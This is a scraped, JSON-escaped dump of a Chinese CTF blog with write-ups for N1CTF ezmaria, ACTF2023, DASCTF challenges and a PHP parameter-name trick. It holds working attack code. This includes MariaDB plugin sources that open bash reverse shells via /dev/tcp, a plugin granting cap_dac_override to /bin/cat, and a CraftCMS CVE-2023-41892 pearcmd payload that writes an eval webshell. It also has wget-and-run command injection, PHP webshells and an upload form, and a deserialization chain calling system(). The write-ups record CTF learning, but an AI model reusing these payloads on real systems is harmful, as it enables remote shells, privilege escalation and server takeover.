$e-\u0026gt;getMessage(); $conn = null; $err = $e-\u0026gt;getMessage(); } ?\u0026gt; \u0026lt;?php // avoid attack if (preg_match(\u0026#34;/(master|change|outfile|slave|start|status|insert|delete|drop|execute|function|return|alter|global|immediate)/is\u0026#34;, $_REQUEST[\u0026#34;id\u0026#34;])){ die(\u0026#34;你就不能绕一下喵\u0026#34;); } ?\u0026gt; \u0026lt;?php $cmd = \u0026#34;select name, price from items where id = \u0026#34;.$_REQUEST[\u0026#34;id\u0026#34;]; //$result = $conn-\u0026gt;query($cmd); if ($conn == null) { //die(\u0026#34;连接失败: \u0026#34; . $conn-\u0026gt;connect_error); $result = $err; $result = \u0026#34;数据库坏了喵\\\\n\u0026#34;. $err; }else{ try { $result = $conn-\u0026gt;multi_query($cmd); $result = $conn-\u0026gt;store_result(); while ($conn-\u0026gt;more_results() \u0026amp;\u0026amp; $conn-\u0026gt;next_result()) { //do nothing } if (!$result){ $result = base64_encode(mysqli_error($conn)); }else{ $result = mysqli_fetch_all($result); $result = $result[0]; $result = var_export($result, true); } }catch(Exception $x){ $result = $x-\u0026gt;getMessage(); $result = \u0026#34;报错了喵\\\\n\u0026#34; . base64_encode($result); } } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0, shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;title\u0026gt;注一下试试呗~❤\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic\u0026amp;amp;display=swap\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header class=\u0026#34;text-center text-white masthead\u0026#34; style=\u0026#34;background:url(\\\u0026#39;https://www.dmoe.cc/random.php\\\u0026#39;)no-repeat center center;background-size:cover;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;lolitafont\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Nu1l Store\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-xl-9 mx-auto position-relative\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-5\u0026#34;\u0026gt;What do you want to buy\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-10 col-lg-8 col-xl-7 mx-auto position-relative\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 col-md-9 mb-2 mb-md-0\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control form-control-lg\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; placeholder=\u0026#34;lolita love U\u0026#34; \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-12 col-md-3\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;开搜\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;style\u0026gt; .left-align { text-align: left; } \u0026lt;/style\u0026gt; \u0026lt;section class=\u0026#34;text-center bg-light features-icons\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Key Source\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?php $hstr = \u0026lt;\u0026lt;\u0026lt;XS \\\\$cmd = \u0026#34;select name, price from items where id = \u0026#34;.\\\\$_REQUEST[\u0026#34;id\u0026#34;]; \\\\$result = mysqli_fetch_all(\\\\$result); \\\\$result = \\\\$result[0]; XS; highlight_string($hstr, false); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Executed Operations:\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?php highlight_string($cmd) ?\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?php highlight_string($result); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;showcase\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid p-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row g-0\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script src=\u0026#34;bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;, ) 传个参试试\n以看到mysql的plugin目录是/mysql/plugin以及secure-file-priv是空的，过滤了outfile但没有过滤dumpfile，而且使用的是multi_query，可以进行堆叠注入\n从上面来看过滤板了function这个关键词也就是说无法利用udf进行create function 但是INSTALL PLUGIN 的功能可以利用，因为同样也是加载 plugin_dir 里边的 so 文件\n所以我们可以编译一个so文件然后让mysql直接install自动加载so文件可以利用这个反弹shell\n可是发现数据库没有初始化，但是利用了skip-grant-tables这个 参考文章： https://blog.csdn.net/ibsfn/article/details/88963040 可以跳过权限进行回复表 利用堆叠注入进行恢复表：\nCREATE DATABASE IF NOT EXISTS mysql; use mysql; CREATE TABLE IF NOT EXISTS plugin ( name varchar(64) DEFAULT \u0026#39;\u0026#39; NOT NULL, dl varchar(128) DEFAULT \u0026#39;\u0026#39; NOT NULL, PRIMARY KEY (name) ) engine=Aria transactional=1 CHARACTER SET utf8mb3 COLLATE utf8mb3_general_ci comment=\u0026#39;MySQL plugins\u0026#39;; 然后编写插件进行自加载so文件\n版本一：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init(){ system(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/PORT 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;);} 参考： https://mp.weixin.qq.com/s/N03QtNsMvpux42xIAXxvrA\n版本二：\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; void lshell(){ system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1 \u0026amp;\u0026#39;\u0026#34;); } class DELETE { public: DELETE(){ lshell(); } }; DELETE delete; DELETE* _mysql_plugin_interface_version_ = \u0026amp;delete; //compile: g++ expso.cpp -shared -fPIC -o exp.so 参考lolita师傅写的： https://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/writeup.md\n将编译出来的so文件用dumpfile写到/mysql/plugin/目录\n可以用lolita师傅写的py直接弹shell\nhttps://github.com/Nu1LCTF/n1ctf-2023/blob/main/web/ezmaria/writeup/exp.py\n发现没有权限读flag 所以找suid和cap(纯抄)\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null getcap -r / 2\u0026gt;/dev/null /usr/bin/mariadb cap_setfcap=ep 关于linux的setcap看文章 https://blog.csdn.net/xdy762024688/article/details/132237969\n大概的意思就是在2.1版本之后有了“分权”的概念，然后利用这个获取读取文件的能力\n也就是我们能给其他文件设置cap\n给mariadb写个插件\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/capability.h\u0026gt; void lshell(){ cap_t caps = cap_from_text(\u0026#34;cap_dac_override=eip\u0026#34;); cap_set_file(\u0026#34;/bin/cat\u0026#34;, caps); printf(\u0026#34;setcap finished\\n\u0026#34;); } class DELETE { public: DELETE(){ lshell(); } }; DELETE _mysql_client_plugin_declaration_; //compile: g++ expcap.cpp -shared -fPIC -o cap.so -lcap2 然后上传到靶机有三个方式 一、发现机器上有curl 直接外部下载远程的服务器上的so文件 二、lolita师傅的exp里面的命令可以直接穿越 三、利用python再次dumpfile进去\n这里当时我有个问题就是\nmariadb --plugin-dir=. --default-auth=cap 他可以自己配路径，所以不需要考虑自己的so文件上传到哪里去 最后直接cat /flag\n拿下 每次复现都能学到很多东西，加油加油\n","date":"3 November 2023","externalUrl":null,"permalink":"/posts/n1ctf-ezmaira/","section":"Posts","summary":"","title":"n1ctf-ezmaira","type":"posts"},{"content":"东方原神大学-MISC #\rfofa 秒了\nMyGO\u0026rsquo;s Live!!!!!-WEB #\r请求：http://124.70.33.170:24000/checker?url=124.70.33.170:80\n直接自己namp\nCraftcms\u0026ndash;WEB #\rcraftcms\nCVE-2023-41892\n网上有POC（无果）\nhttps://gist.github.com/gmh5225/8fad5f02c2cf0334249614eb80cbf4ce\n看了一下poc，出现的地方应该是\\craft\\controllers\\ConditionsController\n猜一手是反序列化+RCE\nhttps://blog.calif.io/p/craftcms-rce\n构造了一下poc 但是好像只能执行phpinfo 发现了账号密码，登录\n备份了下数据库，没看见有什么东西\n思路二：https://www.anquanke.com/post/id/201136 https://www.cnblogs.com/Xy\u0026ndash;1/p/12769094.html https://github.com/vulhub/vulhub/tree/master/php/inclusion\n思路三：percmd https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html\n思路三可以，\npearcmd写入文件\n先用cve包含pearcmd.php然后写入shell\n包含\naction=conditions/render\u0026amp;configObject=craft\\elements\\conditions\\ElementCondition\u0026amp;config={\u0026#34;name\u0026#34;:\u0026#34;configObject\u0026#34;,\u0026#34;as \u0026#34;:{\u0026#34;class\u0026#34;:\u0026#34;\\\\yii\\\\rbac\\\\PhpManager\u0026#34;,\u0026#34;__construct()\u0026#34;:[{\u0026#34;itemFile\u0026#34;:\u0026#34;/usr/local/lib/php/pearcmd.php\u0026#34;}]}} 写入\n/?+config-create+/\u0026lt;?=@eval($_POST[\u0026#39;1\u0026#39;]);die();?\u0026gt;+/tmp/delete 包含了但是执行/readflag没有回显\n蚁剑连一下然后加一个文件\n\u0026lt;?php error_reporting(E_ALL); echo \u0026#34;1\u0026#34;; $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // 标准输入，子进程从此管道中读取数据 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // 标准输出，子进程向此管道中写入数据 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;) // 标准错误，写入到一个文件 ); $file=array(); $process = proc_open(\u0026#34;/readflag 2\u0026gt;\u0026amp;1\u0026#34;, $descriptorspec, $file); var_dump($process); var_dump($file); function readln($file){ $out = \u0026#34;\u0026#34;; $a = fread($file, 1); echo \u0026#34;readln\u0026#34;; while ($a != \u0026#34;\\n\u0026#34;) { $out = $out.$a; $a = fread($file, 1); } return $out; } $data=readln($file[1]); var_dump($data); $data=readln($file[1]); var_dump($data); $ans = \u0026#34;\u0026#34;.eval(\u0026#34;return \u0026#34;.$data.\u0026#34;;\u0026#34;).\u0026#34;\\n\u0026#34;; echo \u0026#34;ans\u0026#34;; var_dump($ans); fputs($file[0], $ans); $data=readln($file[1]); echo $data; $data=readln($file[1]); echo $data; $data=readln($file[1]); echo $data; ?\u0026gt; 直接访问即可\nHook-WEB BY 王曦（赛后） #\rGateway: http://124.70.33.170:8088/\nIntranet jenkins service: http://jenkins:8080/\nHint: Please Abuse Gitxxb Webhooks\n大概看一下题目，猜测需要从nginx打SSRF或者请求走私到内网jenkins，然后实现一些操作。\n无论如何访问nginx服务都是403的状况，根据提示尝试Github/Gitlab的webhook\n在参考文章1和2中发现了有段描述·\ngitlab访问webhook如果出现302可以自动重定向。尝试重定向访问网站 接下来在gitlab中新建project，webhook向vps请求，发生跳转（直接请求地址返回Method Not Allowed） 访问成功，提示了需要加入参数\n成功访问内网服务\n注意一下编码 参考文章\nhttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/ https://www.paloaltonetworks.com/blog/prisma-cloud/repository-webhook-abuse-access-ci-cd-systems-at-scale/ https://devco.re/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/ https://aluvion.github.io/2019/02/26/CVE-2019-1003000%E5%A4%8D%E7%8E%B0/ https://vulhub.org/#/environments/jenkins/CVE-2018-1000861/ Ave Mujica\u0026rsquo;s Masquerade-WEB BY 王曦（赛后） #\r参考\nhttps://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html\n::firefox``:`\n发现可以RCE 构造wget \\3.137.154.242/1 -O /tmp/1.sh，空格替换成$IFS尝试下载\nchecker?url=127.0.0.1::wget$IFS\\vps:port/1$IFS-O$IFS/tmp/1.sh``:`\n然后调用/tmp/1.sh\nchecker?url=127.0.0.1::sh$IFS/tmp/1.sh``:` ","date":"31 October 2023","externalUrl":null,"permalink":"/posts/actf/","section":"Posts","summary":"","title":"ACTF2023 WP","type":"posts"},{"content":"基础 #\rtip: PHPversion \u0026lt;8.0 #\r源代码：\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $var = $_REQUEST[\u0026#39;D T.\u0026#39;]; var_dump($_REQUEST); echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); 可以看见这里做了一个传参，参数名为D T. 我们可以试一下传参 可以看见这里将空格和.号做了转义变成了_\n同样的我们举例子·\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $var = $_REQUEST[\u0026#39;D_T.\u0026#39;]; var_dump($_REQUEST); echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); 明显可以知道，我们无法传入我们需要的参数\n那么此时要用到一个phpversion\u0026lt;8的特性：当传入的参数中含有[时，[会被转义成_但是后面的参数就不会被转义 也就是说 可以看见我们传入的参数名是正确的\n分析 #\r首先，从php官网查看 发现了这个特性 然后我们去github找到对应的代码 可以看见这里对转义写的很明白了 所以我们在php8中可以预见 后面的点号也被转义了\n示例 #\r\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if (preg_match(\u0026#39;/_|%5f|\\.|%2E/i\u0026#39;, $query)){ die(\u0026#39;you are a hacker!\u0026#39;); } $var = $_REQUEST[\u0026#39;D_T_\u0026#39;]; var_dump($_REQUEST); echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); 这时候，需要你去传入D_T_这个参数，这个时候可以看见\n$query = $_SERVER[\u0026lsquo;QUERY_STRING\u0026rsquo;];\n对传入的参数也做了限制，无法直接传入_所以我们就可以利用php的特性 从而进行绕过\n简单的举个CTF中的例子\n\u0026lt;?php highlight_file(__FILE__); error_reporting(0); $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if (preg_match(\u0026#39;/_|%5f|\\.|%2E/i\u0026#39;, $query)){ die(\u0026#39;you are a hacker!\u0026#39;); } $var = $_REQUEST[\u0026#39;D_T.\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; var_dump($_REQUEST); if(is_null($var)){ eval($b); }else{ echo \u0026#39;没有成功！\u0026#39;; } echo \u0026#39;\u0026lt;/br\u0026gt;\u0026#39;; echo phpversion(); 所以我们的playload就是http://127.0.0.1/1/1.php?D T[=1\u0026amp;b=phpinfo();\n","date":"27 October 2023","externalUrl":null,"permalink":"/posts/php-parameter/","section":"Posts","summary":"","title":"PHP中非法参数名问题分析","type":"posts"},{"content":"web 3出2\nweb1 by DT #\r进来先看源码:\n\u0026lt;?php header(\u0026#34;Content-type:text/html;charset=utf-8\u0026#34;); show_source(__FILE__); error_reporting(0); class Flag{ public $a; public $b; public $c; public function __construct(){ $this-\u0026gt;a = 123123; $this-\u0026gt;b = \u0026#39;pwd\u0026#39;; $this-\u0026gt;arr = array(); } public function __destruct(){ echo $a; $this-\u0026gt;arr[$this-\u0026gt;a]=1; if ($this-\u0026gt;arr[]=1){ echo \u0026#39;Please!!!\u0026#39;; } else{ system($this-\u0026gt;b); } } } $was = $_GET[\u0026#39;was\u0026#39;]; unserialize($was); 发现是一个pop，然后在destruct那里做了一个array的限制 那就利用int类型溢出为空的特性构造pop 利用了这个文章：https://blog.csdn.net/starttv/article/details/127905422\n\u0026lt;?php class Flag{ public $a; public $b; public $c; } $e=new Flag(); $e-\u0026gt;$b=\u0026#39;ls\u0026#39;; $e-\u0026gt;$a=9223372036854775807; echo serialize($e); 但是发现不行，本地调试发现没有自己调用construct函数，所以自己添加一个array再次构造pop\n\u0026lt;?php class Flag{ public $a; public $b; public $c; public $arr; } $e=new Flag(); $e-\u0026gt;a=9223372036854775807; $e-\u0026gt;arr=array(); $e-\u0026gt;b=\u0026#39;ls\u0026#39;; echo serialize($e); 发现有test.php等文件，进行查看cat 发现写了一个马子，直接上号 看到了/var/www/html/sql_connect/sql-connect.php\n(尝试修改了代码，没想到真的可以修改，索性直接修改源代码)\n\u0026lt;?php $dbuser = \u0026#39;root\u0026#39;; $dbpass = \u0026#39;root\u0026#39;; $dbname = \u0026#34;dascctf\u0026#34;; $host = \u0026#39;127.0.0.1\u0026#39;; $con = mysqli_connect($host, $dbuser, $dbpass, $dbname) or die(\u0026#39;Could not connect to database.\u0026#39;); $query = \u0026#34;SELECT * FROM flag\u0026#34;; //猜的表名 $result = mysqli_query($con, $query); if ($result) { while ($row = mysqli_fetch_assoc($result)) { foreach ($row as $key =\u0026gt; $value) { echo \u0026#34;$key: $value\u0026lt;br\u0026gt;\u0026#34;; } } } else { echo \u0026#34;Query failed: \u0026#34; . mysqli_error($con); } mysqli_close($con); ?\u0026gt; 直接访问/sql_connect/sql-connect.php` 得到flag\nweb2 by D.T #\r进入发现有个lock，进入看看 简单的文件上传 本地写一个上传马子\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;文件上传表单\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;http://1.14.108.193:43321/Secr3t.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;选择文件：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;上传文件\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 小马\n\u0026lt;?php eval($_POST[\u0026#34;123\u0026#34;]); ?\u0026gt; 上传 Crypto b@se#Lulzcart #\r先下载文件看到密钥和base编码； 我在这里利用了往年的脚本，地址：https://blog.csdn.net/qq_58370970/article/details/123339389\n先编写脚本：\nimport string s = \u0026#39;YOJyHo57WlUFzCfDgjn0Sb9ET****sqVLX42kNaIhr+dtPm1u3AMKpwRGvcxQZ8B\u0026#39; j = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\u0026#39; for i in j: if i not in s: • print(i), 得到缺失的4个字符； 结果：ei6/ 但不知道顺序，可以通过代码整出24种不同的base64变种的排序： 具体脚本：\nstr=\u0026#34;YOJyHo57WlUFzCfDgjn0Sb9ET****sqVLX42kNaIhr+dtPm1u3AMKpwRGvcxQZ8B\u0026#34; ciper=\u0026#34;jHo0gpj5qwNVs5L3/aPVq9ZpEwCX/NZIz7jVs5Xr6pZa/5oIVg\u0026#34;#(==没有用) import string import binascii for i in string.ascii_letters+string.digits: if i not in str: • print(i) import itertools s=[\u0026#39;e\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;6\u0026#39;,\u0026#39;/\u0026#39;] for i in itertools.permutations(s,4): ss=\u0026#34;YOJyHo57WlUFzCfDgjn0Sb9ET\u0026#34;+\u0026#34;\u0026#34;.join(i)+\u0026#34;sqVLX42kNaIhr+dtPm1u3AMKpwRGvcxQZ8B\u0026#34; bins = \u0026#34;\u0026#34; for j in ciper: bins+=bin(ss.index(j))[2:].zfill(6) print(binascii.unhexlify(hex(eval(\u0026#34;0b\u0026#34;+bins))[2:-1])) 运行脚本： 拿到不同的flag,可是这个看起来i think you can get this flag 这个英文句子，最终flag是第二个：\nDASCTF{i_th1nk_you_can_g0t_this_flag}\n","date":"21 October 2023","externalUrl":null,"permalink":"/posts/%E5%A4%A9%E5%B1%B1/","section":"Posts","summary":"","title":"天山固网线上赛WP","type":"posts"},{"content":"","date":"13 September 2023","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"SQL","type":"tags"},{"content":"","date":"13 September 2023","externalUrl":null,"permalink":"/tags/udf/","section":"Tags","summary":"","title":"Udf","type":"tags"},{"content":"这道题是N1大佬做的，叫我来测试一下\nurl:http://dev.xswl.io:8230/\n进入后发现key source 那就可以很简单看出是sql注入\n判断后为数字型，字段数为2，user为root f12-发现让我们查看源码，那就是说要拿到源码，而sql注入中只能利用load_file（）函数进行读取源码\n所以，默认路径下\n拿到源码\n\u0026lt;?php //for n1ctf ezmariadb secret cmd if ($_REQUEST[\u0026#34;SSSSSSSSSSSSSsecret\u0026#34;] === \u0026#34;flag_is_not_here\u0026#34;){ header(\u0026#34;Content-Type: text/plain\u0026#34;); echo \u0026#34;\\\\n\\\\n`ps -ef` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ps -ef\u0026#34;); echo \u0026#34;\\\\n\\\\n`ls -l /` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ls -l /\u0026#34;); echo \u0026#34;\\\\n\\\\n`ls -l /var/www/html/` result\\\\n\\\\n\u0026#34;; system(\u0026#34;ls -l /var/www/html/\u0026#34;); echo \u0026#34;\\\\n\\\\n`find /mysql` result\\\\n\\\\n\u0026#34;; system(\u0026#34;find /mysql\u0026#34;); die(\u0026#34;can you get shell?\u0026#34;); } //lolita init db $servername = \u0026#34;127.0.0.1\u0026#34;; $username = \u0026#34;root\u0026#34;; $password = \u0026#34;123456\u0026#34;; $dbn = \u0026#34;ctf\u0026#34;; //phpinfo(); //die(); // 创建连接 //$conn = new PDO(\u0026#34;mysql:host=$servername;\u0026#34;, $username, $password); //aaa(); $err = \u0026#34;\u0026#34;; try { //$conn = new PDO(\u0026#34;mysql:host=$servername;dbname=$dbn\u0026#34;, $username, $password); $conn = new mysqli($servername, $username, $password, $dbn); //echo \u0026#34;连接成功\u0026#34;; } catch(PDOException $e) { //echo $e-\u0026gt;getMessage(); $conn = null; $err = $e-\u0026gt;getMessage(); } ?\u0026gt; \u0026lt;!-- 读读源码有惊喜哦 --\u0026gt; \u0026lt;?php // avoid attack ?\u0026gt; \u0026lt;?php $cmd = \u0026#34;select name, price from items where id = \u0026#34;.$_REQUEST[\u0026#34;id\u0026#34;]; //$result = $conn-\u0026gt;query($cmd); if ($conn == null) { //die(\u0026#34;连接失败: \u0026#34; . $conn-\u0026gt;connect_error); $result = $err; $result = \u0026#34;数据库坏了喵\\\\n\u0026#34;. $err; }else{ try { $result = $conn-\u0026gt;multi_query($cmd); $result = $conn-\u0026gt;store_result(); while ($conn-\u0026gt;more_results() \u0026amp;\u0026amp; $conn-\u0026gt;next_result()) { //do nothing } $result = mysqli_fetch_all($result); $result = $result[0]; $result = var_export($result, true); }catch(Exception $x){ $result = $x-\u0026gt;getMessage(); $result = \u0026#34;报错了喵\\\\n\u0026#34; . base64_encode($result); } } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0, shrink-to-fit=no\u0026#34;\u0026gt; \u0026lt;title\u0026gt;注一下试试呗~❤\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic,700italic\u0026amp;amp;display=swap\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header class=\u0026#34;text-center text-white masthead\u0026#34; style=\u0026#34;background:url(\\\u0026#39;https://www.dmoe.cc/random.php\\\u0026#39;)no-repeat center center;background-size:cover;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;lolitafont\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;Nu1l Store\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-xl-9 mx-auto position-relative\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-5\u0026#34;\u0026gt;What do you want to buy\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-10 col-lg-8 col-xl-7 mx-auto position-relative\u0026#34;\u0026gt; \u0026lt;form method=\u0026#34;get\u0026#34; action=\u0026#34;\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-12 col-md-9 mb-2 mb-md-0\u0026#34;\u0026gt; \u0026lt;input class=\u0026#34;form-control form-control-lg\u0026#34; type=\u0026#34;text\u0026#34; name=\u0026#34;id\u0026#34; placeholder=\u0026#34;lolita love U\u0026#34; \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-12 col-md-3\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-primary btn-lg\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;开搜\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;style\u0026gt; .left-align { text-align: left; } \u0026lt;/style\u0026gt; \u0026lt;section class=\u0026#34;text-center bg-light features-icons\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Key Source\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?php $hstr = \u0026lt;\u0026lt;\u0026lt;XS \\\\$cmd = \u0026#34;select name, price from items where id = \u0026#34;.\\\\$_REQUEST[\u0026#34;id\u0026#34;]; \\\\$result = mysqli_fetch_all(\\\\$result); \\\\$result = \\\\$result[0]; XS; highlight_string($hstr, false); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;col-md-6\u0026#34;\u0026gt; \u0026lt;h5\u0026gt;Executed Operations:\u0026lt;/h5\u0026gt; \u0026lt;div class=\u0026#34;left-align\u0026#34;\u0026gt; \u0026lt;?php highlight_string($cmd) ?\u0026gt; \u0026lt;br\u0026gt; \u0026lt;br\u0026gt; \u0026lt;?php highlight_string($result); ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section class=\u0026#34;showcase\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container-fluid p-0\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row g-0\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;script src=\u0026#34;bootstrap.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;, )``` 发现参数\n直接请求看看 http://dev.xswl.io:8230/index.php?SSSSSSSSSSSSSsecret=flag_is_not_here\n然后去看/var/www目录的用户为www-data用户的HOME所以没有权限写入文件 也就是说明无法用into outfile 写入木马\n所以我们要看其他的地方有无点\n这里可以看见使用了mysqlli 而mysqli的multi_query支持堆叠注入\n所以，利用堆叠注入getshell的方式就只有慢查询和导出表了\n而慢查询没有权限写入日志 